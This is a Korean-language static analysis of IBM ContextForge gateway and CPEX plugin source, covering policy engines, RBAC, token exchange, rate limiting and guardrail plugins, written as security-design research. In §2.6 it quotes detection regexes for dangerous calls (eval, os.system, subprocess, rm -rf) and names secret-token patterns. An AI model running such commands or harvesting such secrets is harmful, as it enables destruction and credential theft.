# IBM ContextForge와 CPEX 소스 분석 — 2026-09-30 정정·상세본

이 문서는 Gateway 저장소 하나를 검색한 결과를 IBM 전체 제품의 부재로 해석하지 않는다.
아래는 다운로드한 공개 소스의 정적 분석이다. IBM 스택을 띄운 통합·부하 시험 결과가 아니며,
플러그인이 존재한다는 사실과 실제 배포에서 enforce로 활성화되었다는 사실을 구분한다.

## 분석 기준과 이전 보고서 정정

| 저장소 | 검토 커밋 | 범위 |
| --- | --- | --- |
| [IBM/mcp-context-forge](https://github.com/IBM/mcp-context-forge/tree/5735c9db7f8f50cd5a55eb7fefe83ecde00b5324) | `5735c9db7f8f50cd5a55eb7fefe83ecde00b5324` | 인증·토큰 교환·스코프, 플러그인 설정과 PDP 연결 |
| [IBM/cpex-plugins](https://github.com/IBM/cpex-plugins/tree/ae26938128cb438a268e7f3217603bc39b9dd18f) | `ae26938128cb438a268e7f3217603bc39b9dd18f` | 공개 Rust/Python 탐지·호출 제한 구현 |

최초 Claude 보고서는 `cpex-*` 코드를 ContextForge 저장소에서 찾지 못해 **비공개**라고 기록했다.
이는 잘못된 결론이다. CPEX 플러그인은 위의 별도 공개 저장소에 있다. 탐지 로직의 재사용이
불가능하다거나 IBM의 원자성이 확인되지 않았다는 기존 비교를 설계·영업 근거로 사용하면 안 된다.
플러그인 프레임워크 전체의 예외 처리와 실제 운영 설정은 이번 실행 검증 대상이 아니므로 미확인이다.

우리 Gateway가 사용자 SSO 토큰을 upstream으로 패스스루한다는 기존 기술도 잘못됐다.
입구 사용자 토큰과 벤더 자격은 분리되어 있다. 이번 개선에서는 정확한 HTTPS resource와 등록 주체에
결합한 별도 자격 파일을 읽는다. 이것은 RFC 8693 token exchange나 사용자별 OAuth 수명주기 구현은 아니다.

## 0. 구조적 사실 (아래 모든 절의 판단 기준)

`mcpgateway/` 저장소 자체는 FastAPI 게이트웨이 본체이고, 플러그인은 두 갈래로 나뉜다.

1. **저장소 안(`plugins/*.py`)에 소스가 그대로 있는 것** — `deny_filter`, `schema_guard`,
   `code_safety_linter`, `content_moderation`, `harmful_content_detector`, `circuit_breaker`, `watchdog`,
   `regex_filter`, `resource_filter`, `virus_total_checker`, `unified_pdp`(+ native/mac/opa/cedar 어댑터),
   `plugins/external/opa`·`plugins/external/cedar`(독립 플러그인) 등.
2. **`pyproject.toml`에 버전만 적히고 실제 코드는 IBM/cpex-plugins 저장소(공개, 커밋 `ae26938`)에 있는 것**
   — 플러그인 실행 엔진인 `cpex.framework`(우선순위 밴드·훅 체인·`PluginMode`·타임아웃)와
   `cpex-pii-filter`, `cpex-rate-limiter`, `cpex-secrets-detection`, `cpex-sql-sanitizer`,
   `cpex-url-reputation`, `cpex-output-length-guard`, `cpex-retry-with-backoff`, `cpex-encoded-exfil-detection`.

**정정**: 최초 보고서는 이 두 번째 갈래 전체를 "비공개"로 단정했다. 실제로는 **탐지 규칙(정규식·엔트로피 계산·
Redis Lua 스크립트 등)의 Rust 소스는 `IBM/cpex-plugins`에 공개돼 있다** — 아래 §2.4·§2.6에서 파일·줄로 확인한다.
다만 그 규칙들을 훅에 배선하고 우선순위·타임아웃·`PluginMode`(enforce/permissive/disabled)를 판정하는
**`cpex.framework` 자체는 두 클론 어디에도 소스가 없다** — `ibm-cpex-plugins/crates/framework_bridge/src/lib.rs:8`가
`PyModule::import(py, "cpex.framework")`로 외부 Python 패키지를 그냥 가져다 쓸 뿐이다. 즉 "탐지 로직 비공개"는
틀렸고, "오케스트레이션 엔진(예외 처리·타임아웃·fail-open/closed 판정)은 미확인"은 여전히 맞다 — 이 구분을
아래 각 절에서 "코드 있음(규칙)"과 "확인 못 함(오케스트레이터)"으로 표기한다.

또 하나: **`plugins/config.yaml`의 기본값은 전 항목 `mode: "disabled"`다.** 즉 클론한 그대로 배포하면 가드레일이 단
하나도 실행되지 않는다 — 우리 Gateway의 기본 fail-closed(`P-CONTROL-FAIL-CLOSED`)와 정반대의 기본 태도다.
`plugins/config-pii-guardian-policy.yaml`은 이 저장소가 스스로 제공하는 "여기까지 켜면 이렇게 된다" 예시일 뿐, 기본
배포본은 아니다.

## 1. 한 줄 요약

| 절 | 무엇을 봤나 | 우리에게 남긴 것 |
| --- | --- | --- |
| 정책 엔진 | `plugins/unified_pdp/`(native/mac/opa/cedar 어댑터), `plugins/external/opa`·`cedar`(독립 플러그인) | OPA/Cedar 입력 스키마·판정 캐시·엔진 실패 시 `default_decision` 처리는 참고, 캐시·다중 PDP는 가져오지 않음(기존 결론 유지) |
| 인증·인가 | `mcpgateway/middleware/rbac.py`(2계층: 토큰 스코프 → RBAC), `token_scoping.py`(3단 자원 가시성), `oauth_manager.py`(RFC 8693 OBO) | **RFC 8693 token-exchange OBO는 후보** — 우리는 등록 주체별 자격 파일을 읽는 별도 방식이고 사용자 토큰 패스스루가 아니다(정정) |
| 승인·elicitation | `elicitation_service.py`(MCP 스펙의 구조화 입력 요청, 정책 승인과 무관), OPA 플러그인의 `REQUIRES_APPROVAL` 코드는 죽은 코드 | 가져올 것 없음 — 고위험 건별 승인+다이제스트 결합은 우리만 가진 것으로 확인 |
| 호출량·동시성 | `RateLimiterPlugin`(cpex-plugins에 **코드 공개**, Redis Lua 배치로 원자성 확인), `CircuitBreakerPlugin`·`WatchdogPlugin`(코드 공개, in-memory 전역 상태) | watchdog은 사후 감지일 뿐 실행을 끊지 못함(정정, 아래) — circuit breaker의 단일 프로세스 상태 한계, rate limiter의 Lua 원자 배치는 참고 |
| 도구 오염·rug-pull | 설명/스키마 해시 고정·카탈로그 드리프트 감지 코드 **없음**(그렙 0건) | 우리 D-05(잠금 파일 TOFU 금지)가 이 제품에 없는 통제라는 것을 재확인 |
| 콘텐츠 가드레일 | 상시 켜진 `mcpgateway/common/validators.py`(SecurityValidator, 정규식) + 옵트인 플러그인 20여 종. PII/비밀/SQL/URL신뢰도/인코딩은닉 탐지 규칙은 **cpex-plugins에 공개**(아래 §2.6) | 상시 입력 검증기 아이디어는 참고. Rust 플러그인 자체는 들이지 않지만, `secrets_detection/src/patterns.rs`의 **발급자 접두어형 규칙**(GitHub·Slack·Google·Stripe·JWT·AWS 비밀 키)은 정규식으로 옮겨 DLP 라벨과 Presidio `SECRET_TOKEN`에 썼다(D-56). 같은 파일의 일반 hex·base64 규칙은 커밋 해시·SHA-256을 잡아 제외 |
| 감사·관측 | `AuditTrail`(db.py:6673), `PermissionAuditLog`(db.py:1295) — 해시체인·위변조 방지 없음 | 우리 v6 해시체인이 이 제품에 없는 우위임을 재확인. `delegation_chain`·`requires_review` 컬럼은 아이디어로 참고 |
| 서버 생명주기 | 헬스체크 루프(`gateway_service.py`), federation은 승인 게이트 없이 등록=활성 | 기존 결론(federation 가져오지 않음) 유지 |
| 샌드박스 | 프로세스 격리(seccomp/bwrap/apparmor) 코드 **없음** | 격리는 배포(K8s/Docker) 몫, 게이트웨이 자체 기능 아님 확인 |
| 보안 테스트 | `tests/fuzz/test_security_fuzz.py`에 SQLi/XSS/경로탐색/명령주입/헤더주입/LDAP/XXE 리터럴 페이로드 | 그대로 회귀 테스트 입력으로 재사용 가능 |

## 2. 질문 1~10

### 2.1 정책 엔진 연동

**두 개의 독립된 OPA/Cedar 경로가 존재한다** — 서로 다른 입력 스키마를 쓴다.

**(A) `plugins/external/opa/opapluginfilter/plugin.py`, `plugins/external/cedar/cedarpolicyplugin/plugin.py`** — 독립 플러그인(코드 공개).
- 훅: `prompt_pre_fetch`/`post_fetch`, `tool_pre_invoke`/`post_invoke`, `resource_pre_fetch`/`post_fetch` 전부 지원(`opapluginfilter/plugin.py:356-608`).
- 입력 구성(`_preprocess_opa`, `opapluginfilter/plugin.py:233-324`): 정책 적용 대상(`policy_apply_config.tools/prompts/resources`)에서 도구 이름이 일치하는 항목을 찾고, `hook.extensions`에서 `policy`(Rego 패키지명, 필수)·`policy_endpoints`(훅별 엔드포인트 목록, `allow`가 기본)·`policy_input_data_map`(입력 필드 재매핑)·`policy_modality`(text/image/resource, 기본 `["text"]`)를 읽는다. 미지정 시 `UNSPECIFIED_POLICY_PACKAGE_NAME`/`OPA_SERVER_UNCONFIGURED_ENDPOINT` 예외.
- 최종 OPA 입력(`BaseOPAInputKeys`, `opapluginfilter/plugin.py:379,424,462,506,554,596`): `{"input": {"kind": <훅타입>, "user": "none", "payload": <원본 payload 또는 사후훅이면 추출된 modality별 텍스트 리스트>, "context": <hook.context로 고른 global_context.state 일부>, "request_ip": "none", "headers": {}, "mode": "input"|"output"}}`. **`user`와 `request_ip`가 항상 문자열 `"none"`으로 고정**돼 있다 — 신원·IP 기반 정책 판단이 이 경로에서는 구조적으로 불가능하다(확인: 하드코딩, 버그가 아니라 그대로 동작).
- POST URL: `f"{opa_base_url}{policy}/{policy_endpoint}"`(`:320`) — Rego 패키지명을 URL에 직접 이어붙인다.
- 결과 해석(`_evaluate_opa_policy`, `:179-231`): `json_response["result"]`가 bool이면 그대로, dict이고 `"allow"` 키가 있으면 그 값, 그 외(빈 응답 포함)는 `PluginError(OPA_SERVER_NONE_RESPONSE)` 예외 — **여기엔 "승인 필요" 상태가 없다**. `OPAPluginCodes.REQUIRES_HUMAN_APPROVAL_CODE = "REQUIRES_APPROVAL"`가 열거형에 정의는 돼 있으나(`:61`) 실제 훅 코드 6곳 어디에서도 분기되지 않는 **죽은 코드**다.
- 실패 처리: HTTP 오류·타임아웃은 `_post_with_retry`(`:152-177`)가 지수 백오프로 `opa_client_retries`회 재시도 후 그대로 예외를 올린다. 이 예외를 훅 밖의 `cpex.framework`가 어떻게 처리하는지(그 플러그인의 `mode`가 enforce면 차단, permissive면 통과?)는 **여전히 확인 못 함** — §0에서 확인한 대로 `cpex.framework`는 탐지 규칙과 달리 어느 공개 클론에도 소스가 없다(`ibm-cpex-plugins/crates/framework_bridge/src/lib.rs:8`가 외부 Python 패키지로 import할 뿐).

**(B) `plugins/unified_pdp/`** — 통합 PDP, 자체 OPA/Cedar "어댑터"를 내장(코드 공개, (A)와 무관한 별도 구현).
- 훅: `tool_pre_invoke`, `resource_pre_fetch`만(`unified_pdp.py:74-93`). 사후 훅·prompt 훅 없음.
- OPA 어댑터 입력(`opa_engine.py:146-183`): `{"input": {"subject": {email,roles,team_id,mfa_verified,clearance_level,...attrs}, "action": "tools.invoke.<tool>"|"resources.fetch", "resource": {type,id,server,classification_level,...annotations}, "context": {ip,timestamp,user_agent,session_id,...extra}}}`. POST `/v1/data/{policy_path}`(기본 `mcpgateway`) — **docstring(`:10-19`)은 `/v1/data/{policy_path}/allow`라고 적어 놓았지만 실제 구현(`:211`)은 `/allow`를 붙이지 않는다(문서·코드 불일치, 확인).**
- Cedar 어댑터 입력(`cedar_engine.py:198-233`): AWS Cedar 표준 형태 `{"principal":{"type":"User","id":<email>}, "action":{"type":"Action","id":<action>}, "resource":{"type":<Tool|Resource|Prompt|Server>,"id",...attrs}, "context":{...}, "entities":[...]}`. `entities`는 `subject.roles`로부터 Role 엔티티 + roles를 parents로 갖는 User 엔티티를 합성(`:158-195`).
- 결과 해석: OPA는 `result.get("allow", False)` + `result.get("deny", [])`(`:276-277`), **빈 result는 명시적으로 fail-closed(DENY)**(`:268-274`, 주석 "no matching policy – fail closed"). Cedar는 `body.get("decision","Deny")`가 대소문자 무관 `"allow"`와 일치할 때만 ALLOW(`:310-312`).
- 실패 처리(`pdp.py:252-287`): 타임아웃·`PolicyEvaluationError`·기타 예외 전부 잡아서 **`self._config.default_decision`**(기본값 `"deny"`, `unified_pdp.py:148`)로 대체한다 — 즉 fail-open/closed 여부가 **하드코딩이 아니라 운영자가 설정하는 값**이다. `default_decision: allow`로 바꾸면 엔진 다운 시 조용히 전허용된다(경보 없음, 로그 warning만).
- 여러 PDP 조합(`pdp.py:355-441`): `all_must_allow`(AND, 기본) / `any_allow`(OR) / `first_match`(우선순위 최상위 하나만). 엔진은 `parallel_evaluation: true`(기본)면 `asyncio.gather`로 동시 호출.
- **판정 캐시**(`cache.py`): SHA-256(subject+action+resource+context, **timestamp만 제외**) 키의 2단(in-memory LRU + 옵션 Redis) 캐시, 기본 TTL 60초. `invalidate()`(`:261-307`)는 필터 인자를 받아도 **항상 전체 캐시를 플러시**한다(부분 무효화 미구현, 주석 "future improvement"). 승인 만료·철회 같은 시간 종속 판정에 최대 60초의 stale 창을 만든다.

### 2.2 인증·인가

- 신원 원천: 자체 JWT(비밀번호/리프레시 그랜트), 쿠키(`jwt_token`/`access_token`) 또는 `Authorization: Bearer`, 리버스 프록시 헤더 트러스트(`is_proxy_auth_trust_active`, `rbac.py:283-338`) 세 갈래.
  SSO는 **특정 벤더(Entra/Okta 등) 전용 커넥터가 아니라 관리자가 등록하는 범용 OAuth2/OIDC 공급자 테이블**이다
  (`mcpgateway/routers/sso.py:39-140` `SSOProviderCreateRequest.provider_type: str  # oauth2, oidc`, `SSOProviderResponse`).
  주석에 "Google scopes are URLs, Microsoft Graph allows many special..."(`:260`), "'github', 'google'"(`:273`) 같은
  예시가 있어 Google/GitHub/Microsoft(Entra 포함)를 이 범용 OIDC 모델로 등록해 쓰는 것으로 보이나, Entra 전용 클레임 매핑
  코드는 확인 못 함.
- **RBAC은 2계층**(`rbac.py:55-134` `token_scope_grants`, `:727-919` `check_permission_inline`):
  - **Layer 1 (토큰 스코프)**: API 토큰이 들고 있는 `token_scopes` 리스트가 `"*"`/`"<category>.*"`/정확 일치를 만족해야 한다. 빈 리스트나 `None`(세션 토큰)은 "제한 없음, Layer 2에 위임"(deny-all이 아니다).
  - **Layer 2 (RBAC 역할)**: `PermissionService.check_permission()`(팀 스코프 포함). 플러그인이 `HTTP_AUTH_CHECK_PERMISSION` 훅으로 끼어들 수 있고, 플러그인의 grant 판정은 `settings.plugins_can_override_rbac`가 true여야 실제로 반영된다(`:861-870`) — 기본 거부 존중.
  - `mcpgateway/middleware/token_scoping.py:82-291`의 `_PERMISSION_PATTERNS`/`_ADMIN_PERMISSION_PATTERNS`는 (메서드, 경로 정규식) → 필요 권한 매핑이며, **`/admin/*`의 미매핑 경로는 기본 거부**(fail-secure, `:199, 821-826`)이지만 일반 API 경로의 미매핑도 `return False`(`:841`)로 거부.
  - **3단 자원 가시성**(`token_scoping.py:905-1049` `_check_resource_team_ownership`): public(누구나) / team(토큰의 팀과 일치해야) / private(소유자 이메일 일치해야). 알 수 없는 visibility 값은 거부.
  - IP 제한(CIDR)·시간대 제한(업무시간/평일)·사용량 제한(시간당/일당, `TokenUsageLog` 카운트)이 토큰 스코프에 인라인으로 존재(`token_scoping.py:543-708`).
- **대리 실행(OBO) — RFC 8693 토큰 교환이 실제로 구현돼 있다**(`mcpgateway/services/oauth_manager.py:771-882` `token_exchange()`, `grant_type` 분기는 `:255-281`): `grant_type: "urn:ietf:params:oauth:grant-type:token-exchange"`로 `subject_token`(게이트웨이로 들어온 사용자 JWT, `mcpgateway/utils/subject_token.py`가 `Authorization: Bearer` 또는 `jwt_token` 쿠키에서 추출)을 다운스트림 서비스용 토큰으로 교환한다. `subject_token.py:39-56`이 **구조적으로 JWT가 아닌 불투명 토큰(우리 세션/API 토큰 같은)은 subject_token으로 절대 전달하지 않는다**(가드 이름 "H2", CWE-287/346 언급). 응답의 `token_type`이 정확히 `"Bearer"`가 아니면 실패 처리(`oauth_manager.py:867-874`, RFC 8693 §2.2.1 인용).
  **정정**: 우리 Gateway는 사용자 SSO 토큰을 upstream에 그대로 패스스루하지 않는다 — 입구 사용자 토큰과 벤더(upstream) 자격은 분리돼 있고, 정확한 HTTPS resource와 등록 주체(주체별 등록된 서버)에 결합한 별도 자격 파일을 읽는 방식이다. 이것은 RFC 8693 token exchange도 아니고 사용자별 OAuth 수명주기 구현도 아니다 — ContextForge의 이 RFC 8693 구현은 우리가 향후 대리 실행/OBO 확장을 설계할 때의 참조 구현 후보로 남긴다(§4).

### 2.3 고위험 호출의 사람 승인·elicitation

- `mcpgateway/services/elicitation_service.py`는 **MCP 스펙(2025-06-18)의 `elicitation/create`** — 서버가 클라이언트에게 "이 값을 채워 달라"고 요청하는 프로토콜 기능이다. accept/decline/cancel 액션(`:11-13`), 요청은 스키마가 원시 타입(string/number/boolean/enum)의 평평한 객체여야 한다는 제약을 코드로 강제(`_validate_schema`, `:260-310`). 동시 처리 상한(`max_concurrent=100`), 60초 기본 타임아웃, 1분 간격 만료 정리 루프(`:69-259`).
- **이것은 "고위험 실행을 사람이 승인" 흐름이 아니다.** 정책 판정과 결부된 단일 재사용 방지(다이제스트 결합) 승인 개념은 코드에서 찾지 못했다: `REQUIRES_APPROVAL` 코드는 위에서 확인한 대로 죽은 코드이고, 그 외 "approval" 매치는 팀 가입 승인(`teams.py`)·SSO 공급자 활성 승인(`sso_service.py`)·컴플라이언스 보고서 승인(`compliance_service.py`) 뿐이며 전부 관리 작업 승인이지 개별 도구 호출 승인이 아니다.
- **결론**: 우리의 P-X-APPROVAL-001(승인+요청 다이제스트 결합, 1회성 재사용 방지)에 대응하는 기능이 ContextForge에 없다 — 우리 쪽 고유 통제로 문서화할 근거.

### 2.4 호출량·동시성·쿼터·재시도·연쇄 제한

- **`RateLimiterPlugin`**(`kind: cpex_rate_limiter.RateLimiterPlugin`, `plugins/config.yaml:299-316`): **정정 — 코드는 비공개가 아니라 `IBM/cpex-plugins`의 `plugins/rust/python-package/rate_limiter/`에 공개돼 있다.** 확인한 내용:
  - `src/redis_backend.rs:31-108`의 `LUA_BATCH_FIXED`/`LUA_BATCH_SLIDING`/`LUA_BATCH_TOKEN_BUCKET` 세 Lua 스크립트가 fixed window(INCR+EXPIRE), sliding window(ZADD/ZREMRANGEBYSCORE 기반 sorted set), token bucket(HSET 기반 refill)을 각각 구현한다. `evaluate_many_async`(`:678-707`)가 여러 rate-limit dimension(예: by_user/by_tenant/by_tool 각각)을 **한 번의 Redis 호출**로 배치 평가한다.
  - `ensure_script_loaded`/`evalsha_or_eval`(`:598-664`)이 `SCRIPT LOAD`로 SHA를 캐시해 `EVALSHA`를 쓰고, `NOSCRIPT`(Redis 재시작으로 스크립트 캐시 소실)면 `EVAL`로 폴백한다 — Lua 스크립트 자체가 Redis 서버에서 원자적으로 실행되므로 "설정 주석에 Redis만 있고 원자성 소스가 없다"는 기존 문장은 **틀렸다. 정정.**
  - 메모리 백엔드(`memory.rs`)는 프로세스 로컬 상태이고 Redis 백엔드는 여러 게이트웨이 레플리카가 공유하는 상태다 — 이 둘을 구분해야 한다(Codex 정정본과 일치).
  - **여전히 확인 못 한 것**: 이 Redis 백엔드가 실패했을 때(연결 타임아웃 등, `redis_backend.rs:531-566`에서 2초 연결 타임아웃 확인) fail-open/fail-closed를 최종 결정하는 쪽은 `cpex.framework`의 `fail_mode` 판정이며, 그 판정 로직 자체는 §0에서 확인한 대로 어느 클론에도 없다(`redis_backend.rs` 주석의 "existing fail_mode path" 언급만 있고 정의는 다른 곳).
- **`CircuitBreakerPlugin`**(코드 공개, `plugins/circuit_breaker/circuit_breaker.py`): 도구별 실패율(`error_rate_threshold`, 슬라이딩 윈도)과 연속 실패 수(`consecutive_failure_threshold`) 두 조건으로 open, `cooldown_seconds` 뒤 half-open 프로브 1건. **상태 저장소가 `_STATE: Dict[str, _ToolState] = {}`라는 모듈 전역 변수**(`:83`)다 — Redis나 DB가 아니라 **프로세스 로컬 메모리**. 게이트웨이를 여러 레플리카로 띄우면 각 레플리카가 독립적으로 breaker를 트립시킨다(동기화 없음).
- **`WatchdogPlugin`**(코드 공개, `plugins/watchdog/watchdog.py`): `tool_pre_invoke`가 시작 시각을 `context.set_state`에 저장하고(`:87`), `tool_post_invoke`가 경과 시간을 `max_duration_ms`와 비교한다(`:100-116`). **중요한 정정**: 이것은 순수 사후 감지다 — `tool_post_invoke`는 실제 도구 호출이 **이미 완전히 끝난 뒤**에만 실행되므로, `action: "block"`이어도 느린 업스트림 호출 자체를 중간에 끊지 못하고 그 호출이 만든 부작용(쓰기 등)도 이미 일어난 뒤다. 실제 실행 타임아웃은 이 플러그인 밖(HTTP 클라이언트 자체의 타임아웃 설정)에서만 가능하다.
- 호출량 제한과 **실행 중인 작업의 자리·중복·응답 유실**은 다른 요구사항이다. 우리 구현은 기존 PostgreSQL에 주체별 advisory lock과 `call_reservations`를 두고, 먼저 도착한 요청을 함께 센다. 실행 여부가 불명인 작업은 응답을 잃었다고 자리를 즉시 풀지 않는다. lease 만료 뒤 원격 작업의 정확히 한 번 실행까지 보장하는 설계는 아니다. IBM 구현도 같은 시나리오로 실행 시험하기 전에는 어느 쪽이 더 강하다는 순위를 붙이지 않는다.
- 연쇄 실행(우리 PAC-15, "열람→반출 10분 연쇄") 제한 로직은 그렙 결과 **없음** — ContextForge에는 요청 시퀀스 상관관계 개념이 확인되지 않았다.

### 2.5 도구 오염·rug-pull·설명/스키마 검사·카탈로그 변경 감지

- `mcpgateway/services/tool_service.py`에서 "hash"/"integrity"/"checksum"/"pinned" 계열을 검색한 결과, "pinned"는 전부 **SSRF 방지용 IP 고정**(`_build_pinned_rest_http_client`, DNS rebinding 방지) 문맥이었고 도구 설명·스키마의 내용 해시를 등록 시점에 고정해 이후 변경을 감지하는 로직은 찾지 못했다.
- `SPARCStaticValidator`(`plugins/sparc_static_validator/`)와 `SchemaGuardPlugin`(`plugins/schema_guard/`)은 **호출 인자를 스키마와 대조**하는 검증기이지, 도구 설명/스키마 자체의 변조(rug-pull)를 감지하지 않는다.
- 페더레이션(`gateway_service.py`)은 여전히 검토 게이트 없이 피어의 도구를 그대로 들여온다. 게이트웨이 등록도 관리자 권한(`GATEWAYS_CREATE`)만 있으면 즉시 `enabled=true, reachable=?`로 활성화되고 별도의 "가동 전 승인" 단계는 확인되지 않았다.
- **결론**: D-05(잠금 파일 기반 TOFU 금지, 계약 해시 커밋)에 대응하는 기능이 ContextForge에 없다는 기존 결론이 이번 조사로도 그대로 유지된다. cpex-plugins가 공개됐다는 사실도 이 결론과는 무관하다 — 그 저장소는 콘텐츠 탐지 규칙일 뿐 카탈로그 무결성(rug-pull) 방어와는 다른 문제다.

### 2.6 콘텐츠 가드레일: PII·비밀·프롬프트 주입·출력 필터

**전체 플러그인 목록(`plugins/config.yaml` 등록 순서가 아니라 `priority` 오름차순 = 실행 순서, 중요도순으로 다시 정렬)**.
`parallel_execution_within_band: true`(`plugins/config.yaml:11`)이므로 같은 priority 값을 가진 플러그인들은 동시 실행된다.
"위치" 열이 `plugins.*`면 ContextForge 저장소에 소스가 있고(in-repo), `cpex*`면 별도 공개 저장소 `IBM/cpex-plugins`다(§0 정정). 전부 기본 `mode: disabled`.

| priority | 이름 | 훅 | 위치 | 가드레일 성격 |
| --- | --- | --- | --- | --- |
| 10 | SpanAttributeCustomizer, VaultPlugin, UnifiedPDPPlugin, JwtClaimsExtractionPlugin | 다양 | in-repo | 관측/자격/정책/클레임(§2.1, §2.2) |
| 20 | RateLimiterPlugin, PIIFilter | prompt/tool pre | **cpex-plugins(코드 공개)** | 호출량(§2.4), PII |
| 30 | ContentModeration | prompt/tool pre+post | in-repo(LLM 호출) | 유해 콘텐츠 |
| 40 | ArgumentNormalizer | prompt/tool pre | in-repo | 유니코드·공백·날짜 정규화(탐지 아님, 우회 방지 전처리) |
| 45 | SQLSanitizer | prompt/tool pre | **cpex-plugins(코드 공개)** | SQL 위험 문장 |
| 50 | PIIFilterPlugin | 4개 훅 | **cpex-plugins(코드 공개)** | PII — priority 20의 `PIIFilter`와는 등록 이름과 모듈 경로가 다르다. 둘 다 활성화하면 PII 검사가 이중 실행된다(설정 파일상 확인, 실제 런타임 충돌 여부는 `cpex.framework`가 없어 **확인 못 함**) |
| 51 | SecretsDetection | prompt/tool-post/resource-post | **cpex-plugins(코드 공개)** | 비밀(AWS/GCP/GitHub/Stripe/Slack/private key/JWT류) |
| 52 | EncodedExfilDetector | prompt/tool-post/resource-post | **cpex-plugins(코드 공개)** | base64/hex/percent/escaped-hex 인코딩 은닉 반출 |
| 58 | HeaderInjector | resource pre | in-repo | 아웃바운드 헤더 주입(가드레일 아님) |
| 60 | URLReputationPlugin | resource pre | **cpex-plugins(코드 공개)** | URL 신뢰도 |
| 61 | VirusTotalURLCheckerPlugin | 4개 훅 | in-repo(외부 API 호출) | VirusTotal v3 URL/도메인/IP/파일 검사 |
| 63 | RobotsLicenseGuard | resource pre+post | in-repo | robots/noai·라이선스 존중(보안 아님, 컴플라이언스) |
| 65 | SPARCStaticValidator, FileTypeAllowlistPlugin | tool pre / resource | in-repo | 인자 스키마 검증, MIME 허용목록 |
| 70 | CircuitBreaker | tool pre+post | in-repo(프로세스 로컬 상태) | 가용성(§2.4) |
| 75 | ResourceFilterExample | resource+prompt+tool | in-repo(예시) | 도메인 차단·콘텐츠 정규식 치환 예시 |
| 85 | Watchdog | tool pre+post | in-repo | 실행시간 사후 감지(§2.4, 실행 차단 불가) |
| 90 | PrivacyNoticeInjector | prompt post | in-repo | 안내문 삽입(탐지 아님) |
| 96 | HarmfulContentDetector | prompt pre/tool post | in-repo | 자해/폭력/혐오 어휘 정규식 |
| 100 | DenyListPlugin | prompt pre | in-repo | 부분문자열 차단 |
| 110 | SchemaGuardPlugin | tool pre+post | in-repo | 인자/결과 JSONSchema 서브셋 검증 |
| 119-122 | SafeHTMLSanitizer, HTMLToMarkdownPlugin, CitationValidator | resource post 등 | in-repo | XSS 제거, 변환, 링크 검증 |
| 128-155 | ResponseCacheByPrompt, CachedToolResultPlugin, MarkdownCleaner, JSONRepair, ReplaceBadWordsPlugin, ALTKJsonProcessor, CodeSafetyLinterPlugin | 다양 | in-repo | 캐시·정리·치환·코드안전 |
| 160 | OutputLengthGuardPlugin | tool post | **cpex-plugins(코드 공개, 세부 미조사)** | 출력 길이 제한/절단 |
| 170-185 | RetryWithBackoffPlugin, Summarizer, TimezoneTranslator, CodeFormatter, LicenseHeaderInjector | tool/resource post | **cpex-plugins(재시도, 코드 공개, 세부 미조사)**/in-repo | 재시도, 요약(LLM), 서식 |
| 900 | WebhookNotification, ToonEncoder | 다양 | in-repo | 알림, 토큰 절약 인코딩(가드레일 아님) |

**상시 활성(코드 공개, 플러그인이 아니라 게이트웨이 자체 유효성 검사기)**: `mcpgateway/common/validators.py`의 `SecurityValidator` 클래스(`:379` 이하) + 모듈급 컴파일 정규식(`:92-243`). 이름/설명/URI/도구 이름 등 **모든 등록 API 입력**에 대해 항상 실행된다(플러그인 on/off와 무관). 확인된 원문 규칙:
- HTML 위험 태그: `DANGEROUS_HTML_PATTERN`(`:383`), JS 스킴: `DANGEROUS_JS_PATTERN`(`:384`), 폴리글랏 XSS 7종: `_POLYGLOT_PATTERNS`(`:102-108`), SSTI: `_DANGEROUS_TEMPLATE_TAGS_RE`(`:93`)+`_SSTI_DANGEROUS_SUBSTRINGS`/`_SSTI_DANGEROUS_OPERATORS`(`:112-141`), 위험 URL 스킴 8종: `_DANGEROUS_URL_PATTERNS`(`:221-229`), SQL 키워드/특수문자: `_SQL_PATTERNS`(`:239-243`), 셸 위험 문자: `_SHELL_DANGEROUS_CHARS_RE`(`:97`).
- `content_pattern_detection_enabled` + `content_pattern_validation_mode`(strict/moderate/lenient) 설정으로 강도 조절(`tests/integration/test_content_pattern_detection.py:68-70`), **플러그인 프레임워크와 별도 경로**다.

**옵트인 in-repo 플러그인(코드 공개, 기본 `disabled`)**:
- `deny_filter`(`plugins/deny_filter/deny.py:36-114`): 대소문자 무관 부분 문자열 매치, 딕셔너리/리스트 재귀 순회. **`prompt_pre_fetch` 훅뿐**.
- `code_safety_linter`(`plugins/code_safety_linter/code_safety_linter.py:40-48`): `\beval\s*\(`, `\bexec\s*\(`, `\bos\.system\s*\(`, `\bsubprocess\.(Popen|call|run)\s*\(`, `\brm\s+-rf\b` — **`tool_post_invoke`에만**.
- `harmful_content_detector`(`plugins/config.yaml:741-760`): self_harm/violence/hate 3개 카테고리, 카테고리별 정규식 리스트.
- `content_moderation`(`plugins/content_moderation/content_moderation.py`): IBM Watson NLU / **IBM Granite Guardian(Ollama 로컬, `granite3-guardian`)** / OpenAI / Azure / AWS 중 선택하는 카테고리별 임계값+액션(warn/block/redact) 모델. 탐지가 정적 규칙이 아니라 **LLM 판정**. `fallback_on_error: "warn"`이 기본이라 **모델(Ollama) 응답이 실패해도 기본은 통과**(fail-open).

**cpex-plugins 공개 탐지 규칙 원문(이번에 확인, 정정의 핵심)**:

| 플러그인 | 저장소 경로 | 확인한 탐지 로직 |
| --- | --- | --- |
| `pii_filter` | `plugins/rust/python-package/pii_filter/src/patterns.rs:32-158` | SSN(일반+문맥형), 네덜란드 BSN(문맥형만), 신용카드, 이메일, 전화(US+국제), IPv4/IPv6, 생년월일, 여권, 운전면허, 은행계좌/IBAN, 의료기록번호 10종 `RegexSet` 동시 매칭. 관리자가 추가하는 custom pattern은 길이 256자·분기 16개·수량자 24개로 제한해 ReDoS를 막는다(`patterns.rs:286-322`) |
| `secrets_detection` | `.../secrets_detection/src/patterns.rs:8-73` | `aws_access_key_id`(AKIA…), `aws_secret_access_key`, `google_api_key`(AIza…), `github_token`(gh[opusr]_…/github_pat_…), `stripe_secret_key`, `generic_api_key_assignment`, `slack_token`(xox[abpqr]-…), `private_key_block`(PEM 헤더), `jwt_like`, `hex_secret_32`, `base64_24` 11개 정규식 |
